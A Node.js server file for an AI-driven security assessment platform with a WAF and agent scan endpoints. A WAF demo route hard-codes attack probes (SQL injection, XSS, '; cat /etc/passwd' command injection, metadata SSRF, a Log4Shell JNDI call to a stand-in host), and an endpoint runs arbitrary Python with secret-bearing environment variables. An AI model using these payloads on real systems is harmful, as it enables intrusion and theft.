// Server - Express + WebSocket server
// Replaces service-worker.js for server-side operation
// Core AI brain files (agent-loop.js, openrouter.js, openai.js, constants.js, definitions.js)
// are imported UNCHANGED via the chrome-shim adapter

import 'dotenv/config';
import express from 'express';
import { WebSocketServer } from 'ws';
import { fileURLToPath } from 'url';
import { dirname, join, resolve, basename } from 'path';
import { existsSync, mkdirSync } from 'fs';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
// MUST import chrome-shim before any brain files
import './adapters/chrome-shim.js';
import { initBrowser, createPage, closePage, getActivePageId } from './adapters/browser-pool.js';
import { EventStore } from './src/server/event-store.js';
import { WafEngine } from './src/server/waf-engine.js';
import { AgentOrchestrator } from './src/server/agent-orchestrator.js';

// Now import brain files (they use globalThis.chrome from the shim)
import { AgentLoop } from './src/background/agent-loop.js';
import { MSG, STORAGE_KEYS, PROVIDERS } from './src/shared/constants.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || 'localhost';

// Ensure data directories exist
const dataDir = join(__dirname, 'data');
if (!existsSync(dataDir)) mkdirSync(dataDir, { recursive: true });
const downloadsDir = join(dataDir, 'downloads');
if (!existsSync(downloadsDir)) mkdirSync(downloadsDir, { recursive: true });

// ---- Initialize Agent ----
const agent = new AgentLoop();

// ---- OneEye360 platform services ----
const eventStore = new EventStore(dataDir);
const wafEngine = new WafEngine(dataDir, eventStore);
const orchestrator = new AgentOrchestrator(agent, eventStore, wafEngine);

// Pre-populate storage from env if provided
async function initFromEnv() {
  const { chrome } = await import('./adapters/chrome-shim.js');

  if (process.env.OPENROUTER_API_KEY) {
    await chrome.storage.local.set({ [STORAGE_KEYS.API_KEY]: process.env.OPENROUTER_API_KEY });
  }
  if (process.env.OPENAI_API_KEY) {
    await chrome.storage.local.set({ [STORAGE_KEYS.OPENAI_API_KEY]: process.env.OPENAI_API_KEY });
  }
  if (process.env.LLM_PROVIDER) {
    await chrome.storage.local.set({ [STORAGE_KEYS.PROVIDER]: process.env.LLM_PROVIDER });
  }
  if (process.env.AGENT_TEMPERATURE) {
    await chrome.storage.local.set({ [STORAGE_KEYS.TEMPERATURE]: parseFloat(process.env.AGENT_TEMPERATURE) });
  }
  if (process.env.DEFAULT_MODEL) {
    await chrome.storage.local.set({ [STORAGE_KEYS.SELECTED_MODEL]: process.env.DEFAULT_MODEL });
  }
}

// ---- WebSocket Port Adapter ----
// Wraps a WebSocket to look like a chrome.runtime.Port
// so agent-loop.js can use it unchanged via panelPort.postMessage()
function createWsPort(ws) {
  return {
    postMessage(msg) {
      try {
        ws.send(JSON.stringify(msg));
      } catch (e) {
        // WebSocket may be closed
      }
    },
  };
}

// ---- Express App ----
const app = express();

// Security: Helmet for HTTP security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "blob:"],
      connectSrc: ["'self'", "ws:", "wss:"],
      fontSrc: ["'self'", "data:"],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: false,
}));

// Security: Body size limit (prevents DoS via large payloads)
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ limit: '1mb', extended: true }));

// Security: Rate limiting — global
const globalLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests. Please slow down.' },
});
app.use('/api/', globalLimiter);

// Security: Stricter rate limit for Python execution endpoint
const pythonLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Python execution rate limit exceeded.' },
});

// Security: Auth token for API + WebSocket (optional, set in .env)
const AUTH_TOKEN = process.env.AUTH_TOKEN || '';
function _checkAuth(req, res, next) {
  if (!AUTH_TOKEN) return next(); // No token configured = open access (localhost only)
  const token = req.headers.authorization?.replace('Bearer ', '') || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// Security: Only bind to localhost by default
// If HOST=0.0.0.0 is set, AUTH_TOKEN becomes mandatory
if (HOST === '0.0.0.0' && !AUTH_TOKEN) {
  console.warn('\x1b[33m[SECURITY WARNING] Server bound to 0.0.0.0 without AUTH_TOKEN! Set AUTH_TOKEN in .env\x1b[0m');
}

app.use(express.static(join(__dirname, 'public'), {
  etag: false,
  lastModified: false,
  setHeaders: (res, path) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  },
}));

// API: Health check
app.get('/api/health', _checkAuth, (req, res) => {
  res.json({ status: 'ok', version: '2.0.0', product: 'OneEye360' });
});

// API: Get settings
app.get('/api/settings', _checkAuth, async (req, res) => {
  const { chrome } = await import('./adapters/chrome-shim.js');
  const stored = await chrome.storage.local.get([
    STORAGE_KEYS.API_KEY,
    STORAGE_KEYS.OPENAI_API_KEY,
    STORAGE_KEYS.SELECTED_MODEL,
    STORAGE_KEYS.TEMPERATURE,
    STORAGE_KEYS.SYSTEM_PROMPT,
    STORAGE_KEYS.PROVIDER,
    STORAGE_KEYS.SESSION_COST,
    STORAGE_KEYS.SESSION_INPUT_TOKENS,
    STORAGE_KEYS.SESSION_OUTPUT_TOKENS,
    STORAGE_KEYS.SESSION_CACHED_TOKENS,
    STORAGE_KEYS.CUSTOM_INPUT_PRICE,
    STORAGE_KEYS.CUSTOM_OUTPUT_PRICE,
  ]);
  res.json({
    apiKey: stored[STORAGE_KEYS.API_KEY] || '',
    openaiApiKey: stored[STORAGE_KEYS.OPENAI_API_KEY] || '',
    selectedModel: stored[STORAGE_KEYS.SELECTED_MODEL] || '',
    temperature: stored[STORAGE_KEYS.TEMPERATURE] ?? 0.7,
    systemPrompt: stored[STORAGE_KEYS.SYSTEM_PROMPT] || '',
    hasApiKey: !!(stored[STORAGE_KEYS.API_KEY] || stored[STORAGE_KEYS.OPENAI_API_KEY]),
    provider: stored[STORAGE_KEYS.PROVIDER] || PROVIDERS.OPENROUTER,
    sessionCost: stored[STORAGE_KEYS.SESSION_COST] || 0,
    sessionInputTokens: stored[STORAGE_KEYS.SESSION_INPUT_TOKENS] || 0,
    sessionOutputTokens: stored[STORAGE_KEYS.SESSION_OUTPUT_TOKENS] || 0,
    sessionCachedTokens: stored[STORAGE_KEYS.SESSION_CACHED_TOKENS] || 0,
    customInputPrice: stored[STORAGE_KEYS.CUSTOM_INPUT_PRICE] ?? null,
    customOutputPrice: stored[STORAGE_KEYS.CUSTOM_OUTPUT_PRICE] ?? null,
  });
});

// API: Save settings
app.post('/api/settings', _checkAuth, async (req, res) => {
  const { chrome } = await import('./adapters/chrome-shim.js');
  const { apiKey, openaiApiKey, temperature, systemPrompt, provider, customInputPrice, customOutputPrice } = req.body;

  const updates = {};
  if (apiKey !== undefined) updates[STORAGE_KEYS.API_KEY] = apiKey;
  if (openaiApiKey !== undefined) updates[STORAGE_KEYS.OPENAI_API_KEY] = openaiApiKey;
  if (temperature !== undefined) updates[STORAGE_KEYS.TEMPERATURE] = parseFloat(temperature);
  if (systemPrompt !== undefined) updates[STORAGE_KEYS.SYSTEM_PROMPT] = systemPrompt || null;
  if (provider !== undefined) updates[STORAGE_KEYS.PROVIDER] = provider;
  if (customInputPrice !== undefined) updates[STORAGE_KEYS.CUSTOM_INPUT_PRICE] = customInputPrice;
  if (customOutputPrice !== undefined) updates[STORAGE_KEYS.CUSTOM_OUTPUT_PRICE] = customOutputPrice;

  await chrome.storage.local.set(updates);

  // Update agent pricing in real-time
  if (customInputPrice !== undefined || customOutputPrice !== undefined) {
    const currentPricing = agent.modelPricing || {};
    agent.setModelPricing({
      prompt: customInputPrice !== null ? String(customInputPrice / 1000) : currentPricing.prompt,
      completion: customOutputPrice !== null ? String(customOutputPrice / 1000) : currentPricing.completion,
    });
  }

  res.json({ success: true });
});

// API: Get models
app.get('/api/models', _checkAuth, async (req, res) => {
  try {
    await agent.ensureInitialized();
    const models = await agent.client.fetchModels();
    res.json({ models });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// API: Execute Python script (fallback for tool-executor)
app.post('/api/python', _checkAuth, pythonLimiter, async (req, res) => {
  const { writeFileSync, unlinkSync } = await import('fs');
  const { spawn } = await import('child_process');
  const { code, args = [], timeout = 30000 } = req.body;

  if (!code || typeof code !== 'string') {
    return res.json({ success: false, error: 'No code provided.' });
  }

  // Security: Limit code size
  if (code.length > 50000) {
    return res.json({ success: false, error: 'Code too large (max 50KB).' });
  }

  // Security: Sanitize filename (prevent path traversal)
  const safeName = `_py_${Date.now()}_${Math.floor(Math.random() * 10000)}.py`;
  const tmpFile = join(dataDir, safeName);
  writeFileSync(tmpFile, code, 'utf-8');

  const pythonCmd = process.env.PYTHON_PATH || 'python';
  const pyProcess = spawn(pythonCmd, [tmpFile, ...(args || [])], {
    cwd: dataDir,
    env: { ...process.env },
    timeout: Math.min(timeout, 120000),
  });

  let stdout = '';
  let stderr = '';

  pyProcess.stdout.on('data', (data) => { stdout += data.toString(); });
  pyProcess.stderr.on('data', (data) => { stderr += data.toString(); });

  pyProcess.on('close', (exitCode) => {
    try { unlinkSync(tmpFile); } catch {}
    let result = stdout;
    if (stderr) result += (result ? '\n' : '') + '[STDERR]\n' + stderr;
    const MAX_OUTPUT = 8000;
    if (result.length > MAX_OUTPUT) {
      result = result.substring(0, MAX_OUTPUT) + `\n\n... [TRUNCATED: ${result.length} total chars] ...`;
    }
    res.json({ success: exitCode === 0, result, exitCode });
  });

  pyProcess.on('error', (err) => {
    try { unlinkSync(tmpFile); } catch {}
    res.json({ success: false, error: `Python execution failed: ${err.message}. Ensure Python is installed and in PATH.` });
  });
});

// API: Download generated file
app.get('/api/downloads/:filename', _checkAuth, (req, res) => {
  // Security: Prevent path traversal — only allow basename, no slashes/dots
  const safeFilename = basename(req.params.filename);
  if (safeFilename !== req.params.filename) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  const filePath = join(downloadsDir, safeFilename);
  // Security: Ensure resolved path is within downloadsDir
  if (!resolve(filePath).startsWith(resolve(downloadsDir))) {
    return res.status(403).json({ error: 'Access denied' });
  }
  if (existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// API: Execute workflow directly (returns raw results, no LLM)
app.post('/api/execute-workflow', _checkAuth, async (req, res) => {
  const { workflow } = req.body;

  if (!workflow || typeof workflow !== 'object') {
    return res.status(400).json({ error: 'Workflow must be an object' });
  }

  try {
    const result = await agent.executor.workflowEngine.execute(workflow);
    res.json(result);
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// OneEye360 — Dashboard API over the event store
// ============================================================

// API: Dashboard summary (posture score, counts — plain language)
app.get('/api/dashboard/summary', _checkAuth, (req, res) => {
  res.json(eventStore.getSummary());
});

// API: Posture timeline (daily buckets for the chart)
app.get('/api/dashboard/timeline', _checkAuth, (req, res) => {
  const days = Math.min(Math.max(parseInt(req.query.days) || 30, 7), 90);
  res.json({ days, timeline: eventStore.getTimeline({ days }) });
});

// API: Attack log (WAF decisions, filterable)
app.get('/api/attacks', _checkAuth, (req, res) => {
  const { attackType, action, severity, limit = 100, offset = 0 } = req.query;
  const events = eventStore.query({
    types: ['waf_decision'],
    attackType: attackType || undefined,
    severity: severity || undefined,
    limit: Math.min(parseInt(limit) || 100, 500),
    offset: Math.max(parseInt(offset) || 0, 0),
  });
  const items = events
    .filter((e) => !action || e.action === action)
    .map(EventStore.toListItem);
  res.json({ items, count: items.length });
});

// API: Findings (verified agent findings, filterable)
app.get('/api/findings', _checkAuth, (req, res) => {
  const { severity, status, limit = 100, offset = 0 } = req.query;
  let items = eventStore.query({
    types: ['finding'],
    severity: severity || undefined,
    limit: Math.min(parseInt(limit) || 100, 500),
    offset: Math.max(parseInt(offset) || 0, 0),
  }).map(EventStore.toListItem);
  if (status) items = items.filter((f) => (f.status || 'open') === status);
  res.json({ items, count: items.length });
});

// API: Update finding status (open / acknowledged / fixed)
app.patch('/api/findings/:id', _checkAuth, (req, res) => {
  const { status, note } = req.body || {};
  if (!['open', 'acknowledged', 'fixed'].includes(status)) {
    return res.status(400).json({ error: 'status must be open | acknowledged | fixed' });
  }
  const updated = eventStore.updateFindingStatus(req.params.id, status, note);
  if (!updated) return res.status(404).json({ error: 'Finding not found' });
  res.json({ success: true, finding: EventStore.toListItem(updated) });
});

// API: WAF evaluate a payload (testing / lab)
app.post('/api/waf/evaluate', _checkAuth, (req, res) => {
  const { payload, method, path, headers, body } = req.body || {};
  if (payload === undefined && !path && !body) {
    return res.status(400).json({ error: 'payload or request data required' });
  }
  const decision = (path || body)
    ? wafEngine.evaluateRequest({ method, path, headers, body, query: payload })
    : wafEngine.evaluatePayload(payload);
  res.json(decision);
});

// API: WAF simulate — replay classic OWASP-class probes to demo blocking
app.post('/api/waf/simulate', _checkAuth, (req, res) => {
  const probes = [
    { label: 'SQL injection', path: '/login', body: "username=admin' OR 1=1--&password=x" },
    { label: 'XSS', path: '/search', body: '<script>alert("xss")</script>' },
    { label: 'Path traversal', path: '/download?file=../../etc/passwd' },
    { label: 'Command injection', path: '/ping', body: '127.0.0.1; cat /etc/passwd' },
    { label: 'SSRF probe', path: '/fetch?url=http://169.254.169.254/latest/meta-data/' },
    { label: 'Log4Shell', path: '/api/user', headers: { 'X-Api-Version': '${jndi:ldap://evil.d/a}' } },
    { label: 'Legitimate traffic', path: '/products?page=2&sort=price' },
  ];
  const results = probes.map((p) => ({
    label: p.label,
    decision: wafEngine.evaluateRequest({ method: 'GET', ...p }),
  }));
  res.json({ success: true, results });
});

// API: WAF rules (per-tenant, auto-tuned by agent findings)
app.get('/api/waf/rules', _checkAuth, (req, res) => {
  res.json({ rules: wafEngine.listRules(), stats: wafEngine.getStats() });
});

app.post('/api/waf/rules', _checkAuth, async (req, res) => {
  const { pattern, attackType, severity, note } = req.body || {};
  if (!pattern || !attackType) {
    return res.status(400).json({ error: 'pattern and attackType are required' });
  }
  try {
    const rule = await wafEngine.addRule({ pattern, attackType, severity, source: 'manual', note });
    res.json({ success: true, rule });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/waf/rules/:id', _checkAuth, async (req, res) => {
  const removed = await wafEngine.removeRule(req.params.id);
  if (!removed) return res.status(404).json({ error: 'Rule not found' });
  res.json({ success: true });
});

// API: Monthly posture report (plain language)
app.get('/api/report/monthly', _checkAuth, (req, res) => {
  res.json(eventStore.getMonthlyReport({ month: req.query.month }));
});

// API: Scoped agent run (synchronous — returns run report)
app.post('/api/agent/runs', _checkAuth, async (req, res) => {
  const { target, prompt, scope, budget, clear_conversation = true } = req.body || {};
  if (!target && !prompt) {
    return res.status(400).json({ error: 'target or prompt is required' });
  }
  if (target) {
    try {
      await createPage(target, { timeout: parseInt(process.env.BROWSER_TIMEOUT || '30000') });
    } catch (err) {
      console.warn(`[API] Navigation failed: ${err.message} — continuing without page context`);
    }
  }
  try {
    const result = await orchestrator.startRun({ target, prompt, scope, budget, clearConversation });
    res.json({ success: true, ...result });
  } catch (err) {
    res.status(409).json({ success: false, error: err.message });
  }
});

// API: Stop active run
app.post('/api/agent/stop', _checkAuth, (req, res) => {
  orchestrator.stopRun('stopped via API');
  res.json({ success: true });
});

// API: Recent activity feed (all event types, for dashboard)
app.get('/api/events', _checkAuth, (req, res) => {
  const { types, limit = 50 } = req.query;
  const typeList = types ? String(types).split(',') : undefined;
  const items = eventStore.query({ types: typeList, limit: Math.min(parseInt(limit) || 50, 200) })
    .map(EventStore.toListItem);
  res.json({ items });
});

// API: Non-streaming agent execution — send prompt + target URL, get final result
app.post('/api/agent', _checkAuth, async (req, res) => {
  const { prompt, target_url, clear_conversation = false } = req.body;

  if (!prompt || typeof prompt !== 'string') {
    return res.status(400).json({ error: 'prompt is required' });
  }

  await agent.ensureInitialized();

  // Optionally clear previous conversation for a fresh run
  if (clear_conversation) {
    agent.clearConversation();
  }

  // Navigate browser to target URL if provided
  if (target_url) {
    try {
      const pageId = await createPage(target_url, { timeout: 30000 });
      console.log(`[API] Browser navigated to ${target_url} (pageId=${pageId})`);
    } catch (err) {
      console.warn(`[API] Navigation failed: ${err.message} — continuing without page context`);
    }
  }

  // Create a mock port to collect all messages the agent sends
  const collected = {
    chunks: [],
    toolCalls: [],
    toolResults: [],
    errors: [],
    done: false,
    stopped: false,
  };

  const mockPort = {
    postMessage(msg) {
      switch (msg.type) {
        case MSG.BG_CHAT_CHUNK:
          collected.chunks.push(msg.content || '');
          break;
        case MSG.BG_TOOL_START:
          collected.toolCalls.push({
            tool: msg.toolName,
            args: msg.toolArgs,
            callId: msg.toolCallId,
          });
          break;
        case MSG.BG_TOOL_RESULT:
          collected.toolResults.push({
            tool: msg.toolName,
            callId: msg.toolCallId,
            result: msg.result,
          });
          break;
        case MSG.BG_CHAT_ERROR:
          collected.errors.push(msg.error || 'Unknown error');
          break;
        case MSG.BG_CHAT_DONE:
          collected.done = true;
          if (msg.stopped) collected.stopped = true;
          break;
      }
    },
  };

  // Save and replace panel port
  const savedPort = agent.panelPort;
  agent.setPanelPort(mockPort);

  try {
    await agent.run(prompt);
  } catch (err) {
    collected.errors.push(err.message);
  } finally {
    // Restore original port
    agent.setPanelPort(savedPort);
  }

  // Build final response
  const finalText = collected.chunks.join('');
  const response = {
    success: collected.errors.length === 0,
    response: finalText,
    tool_calls: collected.toolCalls,
    tool_results: collected.toolResults.map((tr) => ({
      tool: tr.tool,
      success: tr.result?.success,
      result: tr.result?.success ? tr.result.result : tr.result?.error,
    })),
    session_cost: agent.sessionCost,
    input_tokens: agent.sessionInputTokens,
    output_tokens: agent.sessionOutputTokens,
    cached_tokens: agent.sessionCachedTokens,
  };

  if (collected.errors.length > 0) {
    response.errors = collected.errors;
  }
  if (collected.stopped) {
    response.stopped = true;
  }

  res.json(response);
});

// ---- HTTP Server + WebSocket ----
globalThis.__SERVER_PORT = PORT;
const server = app.listen(PORT, HOST, async () => {
  await initFromEnv();
  await agent.init();
  await eventStore.init();
  await wafEngine.init();
  await initBrowser({ headless: process.env.BROWSER_HEADLESS !== 'false' });
  console.log(`\n  OneEye360 — Autonomous AI Security Operations`);
  console.log(`  Server running at http://${HOST}:${PORT}`);
  console.log(`  Provider: ${agent.provider}`);
  console.log(`  Model: ${agent.client.selectedModel || 'not set'}`);
  console.log(`  API Key: ${agent.client.hasApiKey() ? 'configured' : 'NOT SET'}`);
  console.log(`  Browser: ${process.env.BROWSER_HEADLESS === 'false' ? 'headed' : 'headless'}`);
  console.log(`\n  Open http://${HOST}:${PORT} in your browser to start.\n`);
});

const wss = new WebSocketServer({ server, path: '/ws', maxPayload: 1024 * 1024 }); // 1MB max message

// ---- WebSocket Security ----
const _wsConnections = new Map(); // ip -> count
const _MAX_WS_PER_IP = 5;
const _MAX_WS_MSGS_PER_MIN = 120;
const _wsMsgCounts = new Map(); // ws -> { count, resetTime }

function _getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
}

// ---- WebSocket Connection Handler ----
// This replaces the chrome.runtime.onConnect listener in service-worker.js
wss.on('connection', (ws, req) => {
  const clientIp = _getClientIp(req);

  // Security: Connection limit per IP
  const connCount = _wsConnections.get(clientIp) || 0;
  if (connCount >= _MAX_WS_PER_IP) {
    console.warn(`[Security] WebSocket connection rejected from ${clientIp} (max ${_MAX_WS_PER_IP} per IP)`);
    ws.close(1008, 'Too many connections');
    return;
  }
  _wsConnections.set(clientIp, connCount + 1);

  // Security: Auth token check (if configured)
  if (AUTH_TOKEN) {
    const url = new URL(req.url, 'http://localhost');
    const token = url.searchParams.get('token');
    if (token !== AUTH_TOKEN) {
      console.warn(`[Security] WebSocket auth failed from ${clientIp}`);
      ws.close(1008, 'Unauthorized');
      _wsConnections.set(clientIp, _wsConnections.get(clientIp) - 1);
      return;
    }
  }

  // Security: Message rate limit per connection
  _wsMsgCounts.set(ws, { count: 0, resetTime: Date.now() + 60000 });

  console.log(`Client connected via WebSocket from ${clientIp}`);

  const wsPort = createWsPort(ws);
  agent.setPanelPort(wsPort);

  ws.on('message', async (rawData) => {
    // Security: Rate limit messages
    const msgTracker = _wsMsgCounts.get(ws);
    if (msgTracker) {
      if (Date.now() > msgTracker.resetTime) {
        msgTracker.count = 0;
        msgTracker.resetTime = Date.now() + 60000;
      }
      msgTracker.count++;
      if (msgTracker.count > _MAX_WS_MSGS_PER_MIN) {
        wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: 'Rate limit exceeded. Please slow down.' });
        return;
      }
    }

    // Security: Message size already limited by maxPayload, but double-check
    if (rawData.length > 1024 * 1024) {
      return;
    }

    let msg;
    try {
      msg = JSON.parse(rawData.toString());
    } catch {
      return;
    }

    // Security: Validate message type is a known string
    if (!msg.type || typeof msg.type !== 'string') {
      return;
    }

    await agent.ensureInitialized();

    switch (msg.type) {
      case MSG.PANEL_SEND_CHAT:
        await agent.run(msg.message);
        break;

      case MSG.PANEL_STOP_GENERATION:
        agent.stop();
        break;

      case MSG.PANEL_CLEAR_CHAT:
        agent.clearConversation();
        break;

      case MSG.PANEL_GET_SESSIONS:
        wsPort.postMessage({ type: MSG.BG_SESSIONS_LIST, ...agent.listSessions() });
        break;

      case MSG.PANEL_CREATE_SESSION:
        try {
          await agent.createSession(msg.title);
          wsPort.postMessage({ type: MSG.BG_SESSIONS_LIST, ...agent.listSessions() });
          wsPort.postMessage({ type: MSG.BG_CONVERSATION_HISTORY, conversation: agent.getConversationForPanel() });
          wsPort.postMessage({ type: MSG.BG_SESSION_COST, cost: 0, inputTokens: 0, outputTokens: 0, cachedTokens: 0 });
        } catch (err) {
          wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: err.message });
        }
        break;

      case MSG.PANEL_SWITCH_SESSION:
        try {
          const conversation = await agent.switchSession(msg.sessionId);
          wsPort.postMessage({ type: MSG.BG_SESSIONS_LIST, ...agent.listSessions() });
          wsPort.postMessage({ type: MSG.BG_CONVERSATION_HISTORY, conversation });
          wsPort.postMessage({
            type: MSG.BG_SESSION_COST,
            cost: agent.sessionCost,
            inputTokens: agent.sessionInputTokens,
            outputTokens: agent.sessionOutputTokens,
            cachedTokens: agent.sessionCachedTokens,
          });
        } catch (err) {
          wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: err.message });
        }
        break;

      case MSG.PANEL_DELETE_SESSION:
        try {
          const conversation = await agent.deleteSession(msg.sessionId);
          wsPort.postMessage({ type: MSG.BG_SESSIONS_LIST, ...agent.listSessions() });
          wsPort.postMessage({ type: MSG.BG_CONVERSATION_HISTORY, conversation });
          wsPort.postMessage({ type: MSG.BG_SESSION_COST, cost: agent.sessionCost, inputTokens: agent.sessionInputTokens, outputTokens: agent.sessionOutputTokens, cachedTokens: agent.sessionCachedTokens });
        } catch (err) {
          wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: err.message });
        }
        break;

      case MSG.PANEL_RENAME_SESSION:
        await agent.renameSession(msg.sessionId, msg.title);
        wsPort.postMessage({ type: MSG.BG_SESSIONS_LIST, ...agent.listSessions() });
        break;

      case MSG.PANEL_REVERT_TO:
        await agent.revertTo(msg.messageIndex);
        break;

      case MSG.PANEL_GET_MODELS:
        try {
          await agent.client.init();
          const models = await agent.client.fetchModels();
          wsPort.postMessage({ type: MSG.BG_MODELS_LIST, models });
        } catch (err) {
          wsPort.postMessage({ type: MSG.BG_MODELS_LIST, error: err.message });
        }
        break;

      case MSG.PANEL_SET_PROVIDER:
        await agent._switchProvider(msg.provider);
        await agent.client.setSelectedModel(null);
        try {
          const models = await agent.client.fetchModels();
          wsPort.postMessage({ type: MSG.BG_MODELS_LIST, models });
        } catch (err) {
          wsPort.postMessage({ type: MSG.BG_MODELS_LIST, error: err.message });
        }
        break;

      case MSG.PANEL_SET_MODEL:
        await agent.client.setSelectedModel(msg.model);
        if (msg.pricing) {
          agent.setModelPricing(msg.pricing);
        }
        break;

      case MSG.PANEL_SET_API_KEY:
        await agent.client.setApiKey(msg.apiKey);
        break;

      case MSG.PANEL_SET_SYSTEM_PROMPT:
        agent.setSystemPrompt(msg.systemPrompt);
        break;

      case MSG.PANEL_GET_SETTINGS:
        await agent.client.init();
        const { chrome } = await import('./adapters/chrome-shim.js');
        const stored = await chrome.storage.local.get([
          STORAGE_KEYS.API_KEY,
          STORAGE_KEYS.OPENAI_API_KEY,
          STORAGE_KEYS.SELECTED_MODEL,
          STORAGE_KEYS.TEMPERATURE,
          STORAGE_KEYS.SYSTEM_PROMPT,
          STORAGE_KEYS.PROVIDER,
          STORAGE_KEYS.SESSION_COST,
        ]);
        wsPort.postMessage({
          type: MSG.BG_SETTINGS,
          settings: {
            apiKey: stored[STORAGE_KEYS.API_KEY] || '',
            openaiApiKey: stored[STORAGE_KEYS.OPENAI_API_KEY] || '',
            selectedModel: stored[STORAGE_KEYS.SELECTED_MODEL] || '',
            temperature: stored[STORAGE_KEYS.TEMPERATURE] ?? 0.7,
            systemPrompt: stored[STORAGE_KEYS.SYSTEM_PROMPT] || '',
            hasApiKey: !!(stored[STORAGE_KEYS.API_KEY] || stored[STORAGE_KEYS.OPENAI_API_KEY]),
            provider: stored[STORAGE_KEYS.PROVIDER] || PROVIDERS.OPENROUTER,
            sessionCost: stored[STORAGE_KEYS.SESSION_COST] || 0,
          },
        });
        wsPort.postMessage({ type: MSG.BG_SESSION_COST, cost: agent.sessionCost, inputTokens: agent.sessionInputTokens, outputTokens: agent.sessionOutputTokens, cachedTokens: agent.sessionCachedTokens });
        break;

      case MSG.PANEL_GET_CONVERSATION:
        wsPort.postMessage({
          type: MSG.BG_CONVERSATION_HISTORY,
          conversation: agent.getConversationForPanel(),
        });
        break;

      // ---- Server-specific: URL + prompt scan ----
      // Routed through the orchestrator: scoped run + budget + verification layer
      // + findings persisted to the event store (OneEye360 plan §08).
      case 'START_SCAN': {
        const { url, message } = msg;

        // Create isolated session directory for this scan
        const sessionId = `session_${Date.now()}`;
        const sessionDir = join(dataDir, 'sessions', sessionId);
        if (!existsSync(sessionDir)) mkdirSync(sessionDir, { recursive: true });
        agent.executor.setSessionDir(sessionDir);

        // If URL provided, navigate the server browser to it
        if (url) {
          try {
            console.log(`Navigating to target: ${url}`);
            await createPage(url, {
              timeout: parseInt(process.env.BROWSER_TIMEOUT || '30000'),
            });
          } catch (err) {
            wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: `Failed to load URL: ${err.message}` });
            break;
          }
        }

        const scanMessage = message || (url
          ? `Perform a full security assessment of ${url}. Check for OWASP Top 10 vulnerabilities, analyze forms, inspect headers, scan for secrets, and generate a comprehensive report.`
          : 'How can I help with your security assessment?');

        console.log(`Agent prompt: ${scanMessage.substring(0, 100)}...`);
        try {
          await orchestrator.startRun({
            target: url,
            prompt: scanMessage,
            scope: process.env.AGENT_SCOPE || 'web_app',
            clearConversation: false, // panel chat keeps its own conversation
          });
        } catch (err) {
          wsPort.postMessage({ type: MSG.BG_CHAT_ERROR, error: err.message });
        }
        break;
      }

      // ---- Server-specific: Navigate to URL without starting scan ----
      case 'NAVIGATE': {
        const { url } = msg;
        if (!url) break;

        try {
          const pageId = await createPage(url, {
            timeout: parseInt(process.env.BROWSER_TIMEOUT || '30000'),
          });
          wsPort.postMessage({
            type: 'NAVIGATION_COMPLETE',
            pageId,
            url,
          });
        } catch (err) {
          wsPort.postMessage({
            type: 'NAVIGATION_ERROR',
            error: err.message,
          });
        }
        break;
      }

      default:
        console.log('Unknown message type:', msg.type);
    }
  });

  ws.on('close', () => {
    console.log(`Client disconnected (${clientIp})`);
    agent.setPanelPort(null);
    _wsMsgCounts.delete(ws);
    const count = _wsConnections.get(clientIp) || 1;
    if (count <= 1) _wsConnections.delete(clientIp);
    else _wsConnections.set(clientIp, count - 1);
  });

  ws.on('error', (err) => {
    console.error(`WebSocket error from ${clientIp}:`, err.message);
    agent.setPanelPort(null);
    _wsMsgCounts.delete(ws);
    const count = _wsConnections.get(clientIp) || 1;
    if (count <= 1) _wsConnections.delete(clientIp);
    else _wsConnections.set(clientIp, count - 1);
  });
});

// ---- Graceful Shutdown ----
process.on('SIGINT', async () => {
  console.log('\nShutting down...');
  const { closeBrowser } = await import('./adapters/browser-pool.js');
  await closeBrowser();
  process.exit(0);
});

process.on('SIGTERM', async () => {
  const { closeBrowser } = await import('./adapters/browser-pool.js');
  await closeBrowser();
  process.exit(0);
});
